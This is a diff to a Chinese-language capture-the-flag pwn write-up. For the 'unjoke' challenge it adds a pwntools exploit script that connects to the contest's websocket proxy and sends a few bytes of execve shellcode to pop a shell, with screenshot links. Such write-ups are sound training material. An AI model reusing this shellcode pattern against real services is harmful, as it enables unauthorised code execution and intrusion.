@@ -1,5 +1,5 @@
 CrazyCat PWN
-
+![[Pasted image 20250211194321.png]]
 # Day1
 ## ezpwn
 ![[Pasted image 20250210232353.png]]
@@ -327,6 +327,30 @@ shell：
 ## unjoke
 ![[Pasted image 20250211194038.png]]
 shellcode题，构造一个九字节以内的execve即可~~不会去问DeepSeek~~。
+exp:
+```python
+from pwn import *
+from wstube import websocket
+
+context(arch='amd64', os='linux', log_level='debug')
+local = False
+if local:
+	p = process('./unjoke')
+	pwnlib.gdb.attach(p, 'b read')
+else:
+	p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194f401-5078-7741-ac0c-4c7c4d67ab42')
+
+shellcode ='''
+	push 59
+	pop rax
+	xor esi, esi
+	xor edx, edx
+	syscall
+'''
+p.sendafter('code: ', asm(shellcode))
+p.interactive()
+```
+shell:
+![[Pasted image 20250211194251.png]]
 
 ## Natro
-不会
